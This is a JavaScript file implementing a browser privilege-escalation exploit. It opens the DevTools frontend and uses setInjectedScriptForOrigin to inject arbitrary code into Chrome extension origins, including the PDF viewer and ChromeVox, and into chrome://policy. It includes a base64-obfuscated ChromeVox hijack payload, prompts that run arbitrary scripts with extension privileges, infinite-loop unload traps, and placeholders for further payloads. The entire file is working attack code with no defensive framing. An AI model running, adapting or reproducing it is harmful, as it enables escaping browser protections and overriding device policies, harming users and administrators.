(function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`%%EXTJS%%`))
                    const url = await writeFile('index.html', `${atob('%%EXTHTML%%')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`%%HTMLENTRY%%`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#chromevox_hijack').onclick = function () {
                eval(atob("Y29uc3QgaWZyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7ClVSTF8xPSJjaHJvbWUtZXh0ZW5zaW9uOi8vbW5kbmZva3BnZ2xqYmFhamJuaW9pbWxtYmZuZ3BpZWYvY2hyb21ldm94L2xvZ19wYWdlL2xvZy5odG1sIgppZnIuc3JjID0gVVJMXzE7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyKTsKSW5zcGVjdG9yRnJvbnRlbmRIb3N0LnNldEluamVjdGVkU2NyaXB0Rm9yT3JpZ2luKG5ldyBVUkwoVVJMXzEpLm9yaWdpbiwgYXRvYignS0dGemVXNWpJQ2dwSUQwK0lIc0tJQ0JqYjI1emRDQm1jeUE5SUdGM1lXbDBJRzVsZHlCUWNtOXRhWE5sS0daMWJtTjBhVzl1SUNoeVpYTnZiSFpsS1NCN0NpQWdJQ0IzWldKcmFYUlNaWEYxWlhOMFJtbHNaVk41YzNSbGJTaFFSVkpUU1ZOVVJVNVVMQ0F5SUNvZ01UQXlOQ0FxSURFd01qUXNJSEpsYzI5c2RtVXBPd29nSUgwcE93b0tJQ0JtZFc1amRHbHZiaUIzY21sMFpVWnBiR1VvWm1sc1pTd2daR0YwWVNrZ2V3b2dJQ0FnY21WMGRYSnVJRzVsZHlCUWNtOXRhWE5sS0NoeVpYTnZiSFpsTENCeVpXcGxZM1FwSUQwK0lIc0tJQ0FnSUNBZ1puTXVjbTl2ZEM1blpYUkdhV3hsS0dacGJHVXNJSHNnWTNKbFlYUmxPaUIwY25WbElIMHNJR1oxYm1OMGFXOXVJQ2hsYm5SeWVTa2dld29nSUNBZ0lDQWdJR1Z1ZEhKNUxuSmxiVzkyWlNnS0lDQWdJQ0FnSUNBZ0lHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1puTXVjbTl2ZEM1blpYUkdhV3hsS0dacGJHVXNJSHNnWTNKbFlYUmxPaUIwY25WbElIMHNJR1oxYm1OMGFXOXVJQ2hsYm5SeWVTa2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lHVnVkSEo1TG1OeVpXRjBaVmR5YVhSbGNpaG1kVzVqZEdsdmJpQW9kM0pwZEdWeUtTQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjNjbWwwWlhJdWQzSnBkR1VvYm1WM0lFSnNiMklvVzJSaGRHRmRLU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IzY21sMFpYSXViMjUzY21sMFpXVnVaQ0E5SUNncElEMCtJSEpsYzI5c2RtVW9aVzUwY25rdWRHOVZVa3dvS1NrN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0FnSUNBZ0lDQWdJSDBwT3dvZ0lDQWdJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0lDQWdJR1oxYm1OMGFXOXVJQ2dwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdabk11Y205dmRDNW5aWFJHYVd4bEtHWnBiR1VzSUhzZ1kzSmxZWFJsT2lCMGNuVmxJSDBzSUdaMWJtTjBhVzl1SUNobGJuUnllU2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJR1Z1ZEhKNUxtTnlaV0YwWlZkeWFYUmxjaWhtZFc1amRHbHZiaUFvZDNKcGRHVnlLU0I3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IzY21sMFpYSXVkM0pwZEdVb2JtVjNJRUpzYjJJb1cyUmhkR0ZkS1NrN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCM2NtbDBaWEl1YjI1M2NtbDBaV1Z1WkNBOUlDZ3BJRDArSUhKbGMyOXNkbVVvWlc1MGNua3VkRzlWVWt3b0tTazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ2ZTazdDaUFnSUNBZ0lDQWdJQ0FnSUgwcE93b2dJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQ2s3Q2lBZ0lDQWdJSDBwT3dvZ0lDQWdmU2s3Q2lBZ2ZRb0tJQ0JqYjI1emRDQm9kRzFzVlhKc0lEMGdZWGRoYVhRZ2QzSnBkR1ZHYVd4bEtDSmphSEp2YldWMmIzZ3VhSFJ0YkNJc0lHRjBiMklvSjFCSVRtcGpiV3gzWkVOQ2VtTnRUVGxKYVRSMlpHMDVORXh0Y0hwSmFqUTRURE5PYW1OdGJIZGtSRFE5SnlrcE93b0tJQ0JoZDJGcGRDQjNjbWwwWlVacGJHVW9Jblp2ZUM1cWN5SXNJR0YwYjJJb0oySXlOV3hqYmtwMlkybEJPVWxIUm5OYVdFb3dUM2R2UzFreU9YVmpNMUZuWkcwNU5GWkhWblJqUjNob1pFZFZaMUJUUW1kRGFuaHJZVmhaWjJGWFVUbEpibHAyWlVZNWFtSXlVbXhZTTBveFltMDFiR05wU1N0RGFVRm5VRWRuZUZCdFZqSlpWM2RuV1ZoTloxRXlhSGxpTWpGc1ZtMDVORkJET1c5TlZEUkxTVU5CT0dGRVNTdFdSMmh3WTNsQ2NHTjVRbkZrV0U0d1NVZEZaMk5JU25aaU1sbG5ZakpaWjFreU9YVlpNbFozWkVOM1oxbHRWbk5pTTJObldWaEtiRWxIVG05amJUbDBXbGhhZG1WSFZucEpTRUpzWTIweGNHTXpUbkJpTWpWNlVFTTViMDFxTkV0SlEwRTRZMFExVVZwWVNuUmhXRTU2WVZjNWRXTjZiMmRLU0hScVlVaEtkbUpYVlhWamJsWjFaRWRzZEZwVE5XNWFXRkpPV1ZjMWNGcHRWbnBrUTJkd1RHNUNiR050TVhCak0wNXdZakkxZWt4dGNIWmhWelJ2U25sM1owcDViRGxRUXpsM1VHZHZaMGxFZUhkUWExWTBaRWRXZFdNeWJIWmlhVUpLVWtSdlowcElkR3BoU0VwMllsZFZkV051Vm5Wa1IyeDBXbE0xY0ZwSU1EaE1NMEVyVUVkb2VWQm5iMmRKUkhnd1dsaG9NRmxZU214WlUwSndXa1F3YVZreU9XdGFWamx3WW01Q01XUkRTV2RqTTFJMVlrZFZPVWx1WkhCYVNGSnZUMmxCTTAxRFZUZEpSMmhzWVZka2IyUkViMmROVkZWM1kwaG5OMGxJU214ak1tdzJXbFJ2WjFsdE9UQmhSSE5wVUdwM2RtUkhWalJrUjBaNVdsZEZLME5wUVdkUVIwb3haRWhTZG1KcFFuQmFSREJwV1RJNWExcFdPWGxrVnpScFVHeEtNV0pxZDNaWmJsWXdaRWM1ZFZCcWVHOWphalJMU1VOQk9GbHVWakJrUnpsMVNVZHNhMUJUU25waFJ6a3pXREphYkZwWFVtbFpWMDV5U1dvMVZHRkhPVE5KUlZwc1dsZFNhVmxYVG5KUVF6bHBaRmhTTUdJeU5DdFFSMHA1VUdkdlowbEVlR2xrV0ZJd1lqSTBaMkZYVVRsSmJWb3hZbTAxTlZneVNqRmtTRkoyWW13NWQySklUbVpaTW5od1dUSnphVkJzYkhaa1UwSjZZVWM1TVdKSFVXZGtSemt3V1ZkNGMyVlRRbXBpUjJ4cVlYbENNR0ZIYkhwSlJ6VjJaRWRvY0dKdFkyZGtNbXh6WWtOQ2IxbFlRbmRhVnpSblpFaEtNV016VVdkaVYxVTRUREpLTVdSSVVuWmlhalE0V1c1SkswTnBRV2RRUjBveFpFaFNkbUpwUW5CYVJEQnBXakpXTUZneVNtaGtTRkpzWTI1cmFWQnJaR3hrUTBKRFdWaFNNRnBZU2pWSlNFNHdXVmhTTVdONmQzWlpibFl3WkVjNWRWQnFlR2xqYWpSTFNVTkJPR1JIVmpSa1IwWjVXbGRGWjJGWFVUbEpibEpvV1d3NWRtTkhWblZZTTFaNVlrTkpLMUJET1RCYVdHZ3dXVmhLYkZsVU5EaFpibFl3WkVjNWRVbEhiR3RRVTBvd1dWZEtabUl6UW14aWJWWjVTV28xVUdOSFZuVkpSbFpUVkVOQ2NHSnBRblZhV0dOblpFZEdhVkJET1dsa1dGSXdZakkwSzFCSFNubFFaMjg0VERKU2NHUnFORXRaUkhOTFEyMU9jMWxZVG5wSlJscDJaVU5DTjBOcFFXZGpNMUpvWkVkc2FrbEhaR3hrUlZwVVMwTnJaMlYzYjJkSlEwRm5ZMjFXTUdSWVNuVkpSelZzWkhsQ1VXTnRPWFJoV0U1c1MwaEtiR015T1hOa2JWVm5VRlEwWjJWM2IyZEpRMEZuU1VOQ00xcFhTbkpoV0ZKVFdsaEdNVnBZVGpCU2JXeHpXbFpPTldNelVteGlVMmhWVWxVeFVWUXhTa0pWYkd0elNVUkpaMHRwUVhoTlJFa3dTVU52WjAxVVFYbE9RM2RuWTIxV2VtSXllREphVTJzM1EybEJaMGxEUWpsTFZITkxTVU5DT1VObmIyZEpTRTR3V1ZoU2NGbDVRbWhqTTJ4MVdYbENNMk50YkRCYVZWcHdZa2RWYjFwdVRYTkpSMXB3WWtkV2RWbFhNV3hNUTBKcldWaFNhRXRUUWpkRGFVRm5TVU5DZVZwWVVqRmpiVFJuWW0xV00wbEdRbmxpTWpGd1l6SlZiMHRJU214ak1qbHpaRzFWYzBsSVNteGhiVlpxWkVOcloxQlVOR2RsZDI5blNVTkJaMGxEUW0xamVUVjVZakk1TUV4dFpHeGtSVnB3WWtkVmIxcHRiSE5hVnpWb1lsZFZjMGxJYzJkWk0wcHNXVmhTYkU5cFFqQmpibFpzU1Vnd2MwbEhWblZrU0VvMVNVUXdLMGxJYzB0SlEwRm5TVU5CWjBsRFFteGlibEo1WlZNMWVWcFhNWFprYlZWdlMwTnJaMUJVTkdkbGQyOW5TVU5CWjBsRFFXZEpRMEZuV201TmRXTnRPWFprUXpWdVdsaFNSMkZYZUd4TFIxcHdZa2RXZFZsWE1XeE1RMEkzU1VkT2VWcFhSakJhVkc5blpFaEtNVnBUUWpsTVEwSnNZbTVTZVdWVVNXZFFWRFJuWlhkdlowbERRV2RKUTBGblNVTkJaMGxEUW14aWJsSjVaVlJKZFZrelNteFpXRkpzVmpOS2NHUkhWbmxMU0dSNVlWaFNiR05wUVRsUWFVSTNRMmxCWjBsRFFXZEpRMEZuU1VOQlowbERRV2RrTTBwd1pFZFdlVXh0T1hWa00wcHdaRWRXYkdKdFVXZFFVMEZ2UzFOQk9WQnBRbmxhV0U1MllraGFiRXRIVm5Wa1NFbzFUV2sxTUdJeFZsTlVRMmR3UzFSelMwbERRV2RKUTBGblNVTkJaMGxEUVdkSlEwSXpZMjFzTUZwWVNYVmlNalZzWTI1S2RtTnBRVGxKU0Vwc1lXMVdhbVJFYzB0SlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VOQ00yTnRiREJhV0VsMVpETktjR1JIVlc5aWJWWXpTVVZLYzJJeVNXOVhNbEpvWkVkR1pFdFRhemREYVVGblNVTkJaMGxEUVdkSlEwRm5TVWd3Y0U5M2IyZEpRMEZuU1VOQlowbERRV2RtVTJzM1EybEJaMGxEUVdkSlEwRm5abE5yTjBOcFFXZEpRMEZuU1Vnd2NFOTNiMmRKUTBGblpsTnJOME5wUVdkbVVXOUxTVU5DZW1SSFJqQmhWMDFuV1ZoT05XSnRUV2RqYmxaMVVUSTVhMXBUYUdwaU1sSnNTMU5DTjBOcFFXZEpRMEpxWWpJMWVtUkRRbTFqZVVFNVNVZEdNMWxYYkRCSlJscDJaVU0xYmxwWVVrZFZlV2R3VDNkdlowbERRV2RaTWpsMVl6TlJaMlJZU25OSlJEQm5XVmhrYUdGWVVXZFdiVGswVEc1a2VXRllVbXhTYld4eldsTm9iV041ZDJkSmJrNTVXWGsxY1dONVNYTkpSMDUyV2tkVmNFOTNiMHRKUTBGblNVTTRka2xHU214aVZ6a3lXbE5DYkdWSGJIcGtSMngxV25sQ2Vsa3pTbkJqU0ZGbllWZFpaMWxYTlRWRGFVRm5TVU5DYW1JeU5YcGtRMEoyWWtkU1ZGa3pTbkJqU0ZGblVGTkNhMkl5VGpGaVYxWjFaRU0xYmxwWVVrWmlSMVowV2xjMU1GRnViRXBhUTJkcFdsaGFhR0pJVm1oa1IxWm1XbGQ0YkdKVFNYQlBkMjluU1VOQloyRlhXV2RMUnpseldrWk9hbU50Ykhka1EydG5Zako0YTFVeVRubGhXRUl3VEc1S2JHSlhPVEphVTJkd1QzZHZTMGxEUVdkSlF6aDJTVVZHZDJOSFZuVmFRMEoxV2xoaloyTXlUbmxoV0VJd1NVaGtjR1JIWjJkak0wcHFTVWhPYkdSRFFqQmllVUp0WVZkNGJFbEdWbE5VUVc5blNVTkJaMWt5T1hWak0xRm5ZekpPZVdGWVFqQkpSREJuV2tjNWFtUlhNV3hpYmxGMVdUTktiRmxZVW14U1YzaHNZbGRXZFdSRFoybGpNazU1WVZoQ01FbHBhemREYVVGblNVTkNlbGt6U25CalNGRjFZVmRSWjFCVFFXbGFXRnBvWWtoV2FHUkhWbVphVjNoc1lsTkpOME5wUVdkSlEwSjZXVE5LY0dOSVVYVmpNMHBxU1VRd1oyUllTbk5QZDI5blNVTkJaMXBIT1dwa1Z6RnNZbTVSZFZsdE9XdGxVelZvWTBoQ2JHSnRVa1JoUjJ4eldrTm9lbGt6U25CalNGRndUM2R2WjBsSU1FdERhVUZuWXpOU2FHUkhiR3BKUjBacVpFZHNNbGxZVW14TFEydG5aWGR2WjBsRFFXZGFSemxxWkZjeGJHSnVVWFZrTTBwd1pFZFZiMlJ0T1RSV1IxWjBZMGQ0YUdSSFZYQlBkMjluU1VOQloxcEhPV3BrVnpGc1ltNVJkVmt5ZUhaak1sVnZTMVJ6UzBOcFFXZEpRMEpyWWpKT01XSlhWblZrUXpWdVdsaFNSbUpIVm5SYVZ6VXdVVzVzU2xwRFoybFpNamxyV2xZNWVXUlhOR2xMVXpWb1drZFNSbVJ0Vm5Wa1JYaHdZek5TYkdKdFZubExRMHBxWWtkc2FtRjVTWE5KUjBaNlpWYzFha2xEWjNCSlJEQXJTVWh6UzBsRFFXZEpRMEZuV1RJNWRXTXpVV2RaTWpscldsTkJPVWxIVW5aWk0xWjBXbGMxTUV4dFpHeGtSVlp6V2xjeGJHSnVVa05sVld4clMwTkthbUl5VW14WU1teDFZMGhXTUVscGEzVmtiVVp6WkZkVk4wTnBRV2RKUTBGblNVZEdNMWxYYkRCSlJscDJaVU0xZVdSWE5VUmlNbEpzUzBkT2RscEhWWEJQZDI5blNVTkJaMlpUYXpkRGFVRm5TVU5DYTJJeVRqRmlWMVoxWkVNMWJscFlVa1ppUjFaMFdsYzFNRkZ1YkVwYVEyZHBZekpvZG1ReE9XMWFWMVpyV1cxR2FtRjVTWEJNYlVacldrVldNbHBYTlRCVVIyeDZaRWRXZFZwWVNXOUpiVTV6WVZkT2NrbHBkMmRaV0U0MVltMU5aMHREYTJkUVZEUm5aWGR2WjBsRFFXZEpRMEpvWkRKR2NHUkRRbGRpTTJkMVkyNVdkVkV5T1d0YVUyaG5XVEpvZVdJeU1XeE1iVnBzV2xkU2FWbFhUbkpWU0Vwd1pHMUdNRnBUTlhaalIxWjFVbTFXYkZwSFNtaFpNbk52U2pOR01XRlhUbkppTWxwdFlWZE9iRXA1YXpkWlEyczNRMmxCWjBsRFFqbExWSE5MU1VOQlowbEhVblpaTTFaMFdsYzFNRXh0Wkd4a1JWWnpXbGN4YkdKdVVrTmxWV3hyUzBOS2JXUlhOWFZsVmpscFpGaFNNR0l5TldaalIzaDZXREpPYzJGWFRuSkphV3QxV1ZkU2ExSllXbXhpYmxKTllWaE9NRnBYTld4amFXZHBXVEo0Y0ZreWMybE1RMEpvWXpOc2RWbDVRVzlMVTBFNVVHbENOME5wUVdkSlEwRm5TVWRHTTFsWGJEQkpSbHAyWlVNMWVXUlhOVVJpTWxKc1MwZENhbUZJU25aaVYxVjFXVmRPYWxwWVRucGhWMHB3WWtkc01HVldRbmxoV0Zwb1pFZFZkVnBIUm5saE1sWjFWVEpPZVZwWFZuVkxTRko1WkZkVmNFOHlRWEJQZDI5blNVTkJaMlpUYXpkRGFVRm5TVU5DYTJJeVRqRmlWMVoxWkVNMWJscFlVa1ppUjFaMFdsYzFNRkZ1YkVwYVEyZHBXakpXTUZneVNtaGtTRkpzWTI1cmFVdFROV2hhUjFKR1pHMVdkV1JGZUhCak0xSnNZbTFXZVV0RFNtcGlSMnhxWVhsSmMwbEhSbnBsVnpWcVNVTm5jRWxFTUN0SlNITkxTVU5CWjBsRFFXZFpXR1JvWVZoUloxWnRPVFJNYmtveFltdE9kbHBIVlc5WlIwNXZZMjA1ZEZwVE5XaFpNazVzWXpOT2NGbHRiSE5oV0ZJMVZVaEtjR1J0UmpCYVV6VnVXbGhTUTFsWVVqQmFXRW8xVWtkV2Vsa3pTbkJqU0ZKd1lqSTBiMWxYZUd4amJsRndUekpCY0U5M2IyZEpRMEZuWmxOck4wTnBRV2RKUTBKcllqSk9NV0pYVm5Wa1F6VnVXbGhTUm1KSFZuUmFWelV3VVc1c1NscERaMmxrUjBacFdESTVkMXBYTld4amFVbHdURzFHYTFwRlZqSmFWelV3VkVkc2VtUkhWblZhV0VsdlNXMU9jMkZYVG5KSmFYZG5XVmhPTldKdFRXZExRMnRuVUZRMFoyVjNiMmRKUTBGblNVTkNhbUl5Tlhwa1EwSXdXVmRLZG1OSFZuVmtXRXB6U1VRd1oxcEhPV3BrVnpGc1ltNVJkVm95VmpCU1YzaHNZbGRXZFdSRlNqVlRWMUZ2U1c1U2FGbHNPWFpqUjFaMVdETldlV0pEU1hCTWJscG9Za2hXYkU5M2IyZEpRMEZuU1VOQ2FHUXlSbkJrUTBKWFlqTm5kV051Vm5WUk1qbHJXbE5vWjFreWFIbGlNakZzVEc1U2FGbHVUWFZaTTBwc1dWaFNiRXRJZERsTVEwRnZTMU5CT1ZCcFFqZEpSMDV2WTIwNWRGcFROVEJaVjBwNlRHNVdkMXBIUmpCYVUyZzNaRmhLYzA5cFFXbFpRM1F3V1ZkS2RtTkhWblZrV0VwelN6SkJhV1pUYXpkSlIwNXZZMjA1ZEZwVE5UQlpWMHA2VEc1S2JHSkhPV2hhUTJkd1QzbENPVXRVZEdkTFZITkxTVU5CWjBsSU1IQlBkMjluU1Vnd1MyWlJjRE5oVnpWcllqTmpkV0l5TlhOaU1rWnJTVVF3WjB0RGEyZFFWRFJuWlhkdlowbEdXblpsUXpWb1dUTlNjR1J0UmpCYVUyZHdUM2R3T1U5M2J6MG5LU2s3Q2dvZ0lHRnNaWEowS0doMGJXeFZjbXdwT3dwOUtTZ3BPd289JykpOyAvLyA8LSBCYXNlNjQgZW5jb2Rpbmcgb2YgY2hyb21ldm94LXBheWxvYWQuanM="));
            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
